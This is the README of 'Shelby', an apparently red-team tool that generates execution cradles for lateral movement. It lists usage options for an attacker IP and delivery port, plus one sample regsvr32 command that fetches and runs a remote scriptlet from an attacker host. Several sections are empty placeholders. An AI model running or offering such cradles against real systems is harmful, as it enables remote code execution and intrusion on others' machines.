<p align="center">
  <img alt="By Order of the Peaky Blinders" src="https://i.imgur.com/5n0ly8K.png" height="140"/>
  <p align="center">
    <a href="https://github.com/ad-995/shelby/releases/latest"><img alt="Release" src="https://img.shields.io/github/release/ad-995/shelby.svg?style=flat-square"></a>
    <a href="https://github.com/ad-995/shelby/blob/master/LICENSE"><img alt="Software License" src="https://img.shields.io/badge/license-MIT-brightgreen.svg?style=flat-square"></a>
    <a href="https://github.com/ad-995/shelby/issues"><img alt="GitHub issues" src="https://img.shields.io/github/issues/ad-995/shelby.svg?style=flat-square"></a>
    </p>
</p>

<h5 align="center"><i>Execution Cradle Generation!</i></h5>

`Shelby` is a Execution Cradle Generator inspired by [PoshC2](https://github.com/nettitude/PoshC2/blob/master/poshc2/server/Payloads.py) and their `PoshC2_Project/quickstart.txt` documentation. 

The aim of this project is to automatically generate several commonly used Execution Cradles in the hopes of lateral movement. 

***

## Introduction
Purpose

## Shells
The available shells

## Cradles
The available cradles

## Modularity
Adding to Shelby

## Example
Below is an example output:
![Shelby Output](https://i.imgur.com/cQPOSOC.png)


## Usage
```
usage: shelby.py [-h] -i  [-w] [-p] [-d]

Giver of shells

optional arguments:
  -h, --help            show this help message and exit
  -i , --ip-address     Attacker IP Address
  -p , --cradle-port    Port for receiving shells
  -w , --web-delivery   Port for serving shells
  -d , --directory      Directory for generated payloads
```

There are some important things to note here:
- `--ip-address`: The IP Address that the `shells` will be coming back to.
- `--cradle-port`: The Port that the `shells` will be coming back to.
- `--web-delivery`: The Port that the `cradles` will use to retrieve the `shell`.
- `--directory`: The Directory in which all the `cradles` and `shells` will be saved to. As well as the `cradle_commands.txt` file.

The `cradle_commands.txt` file contains all the Execution Cradle commands. For example:

```
regsvr32:
regsvr32 /s /n /u /i:http://10.10.11.58:80/sctlvjzqylbdzdl scrobj.dll
```

As more Execution Cradles are added, the format will be the same.:

```
Method:
Cradle Command
```

Finally, the easiest usecase here is to serve the `./web_delivery` directory with `python -m SimpleHTTPServer 80`. 

A project by [mez-0](https://github.com/mez-0) & [michaelranaldo](https://github.com/michaelranaldo)